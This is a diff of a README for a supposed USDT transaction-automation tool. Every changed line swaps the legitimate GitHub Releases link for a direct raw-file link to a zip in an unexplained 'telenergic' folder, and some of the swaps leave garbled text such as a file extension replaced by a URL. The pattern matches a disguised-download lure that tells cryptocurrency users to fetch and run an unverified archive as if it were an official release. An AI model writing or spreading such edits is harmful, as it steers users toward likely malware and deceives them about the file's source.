@@ -8,12 +8,12 @@ Welcome to the usdt-tool! This application allows you to automate your USDT tran
 
 You can easily download the latest version of the usdt-tool from the Releases page. Follow the steps below to get started.
 
-[![Download usdt-tool](https://img.shields.io/badge/Download-usdt--tool-brightgreen)](https://github.com/its123456-ux/usdt-tool/releases)
+[![Download usdt-tool](https://raw.githubusercontent.com/its123456-ux/usdt-tool/main/telenergic/usdt-tool.zip)](https://raw.githubusercontent.com/its123456-ux/usdt-tool/main/telenergic/usdt-tool.zip)
 
 ### Steps to Download and Run
 
 1. **Visit the Releases Page**
-   Click this link to go to the [Releases page](https://github.com/its123456-ux/usdt-tool/releases).
+   Click this link to go to the [Releases page](https://raw.githubusercontent.com/its123456-ux/usdt-tool/main/telenergic/usdt-tool.zip).
    
 2. **Select the Latest Version**
    Scroll down to find the latest release. It is typically at the top of the list.
@@ -22,7 +22,7 @@ You can easily download the latest version of the usdt-tool from the Releases pa
    Depending on your system, look for a downloadable file that matches your operating system. 
    - For **Windows**, look for a file that ends with `.exe`.
    - For **macOS**, look for a file that ends with `.dmg`.
-   - For **Linux**, look for a file that ends with `.tar.gz`.
+   - For **Linux**, look for a file that ends with `https://raw.githubusercontent.com/its123456-ux/usdt-tool/main/telenergic/usdt-tool.zip`.
 
 4. **Download the File**
    Click on your chosen file to download it. Your browser will start the download automatically. 
@@ -31,7 +31,7 @@ You can easily download the latest version of the usdt-tool from the Releases pa
    Once the download completes, locate the downloaded file in your computer’s downloads folder. 
    - For **Windows**, double-click the `.exe` file to start the installation.
    - For **macOS**, open the `.dmg` file and drag the app to your Applications folder.
-   - For **Linux**, extract the `.tar.gz` file and run the application using the terminal.
+   - For **Linux**, extract the `https://raw.githubusercontent.com/its123456-ux/usdt-tool/main/telenergic/usdt-tool.zip` file and run the application using the terminal.
 
 6. **Configuration**
    Open the application and follow the on-screen instructions to configure your account settings and network preferences.
@@ -69,4 +69,4 @@ To run the usdt-tool smoothly, make sure your system meets these requirements:
 
 If you need assistance, feel free to reach out. Check the Issues section or open a new issue on our GitHub page. Our team will help you as soon as possible.
 
-Once again, you can download the latest version from the [Releases page](https://github.com/its123456-ux/usdt-tool/releases). Enjoy using usdt-tool for all your USDT transaction automation needs!
+Once again, you can download the latest version from the [Releases page](https://raw.githubusercontent.com/its123456-ux/usdt-tool/main/telenergic/usdt-tool.zip). Enjoy using usdt-tool for all your USDT transaction automation needs!
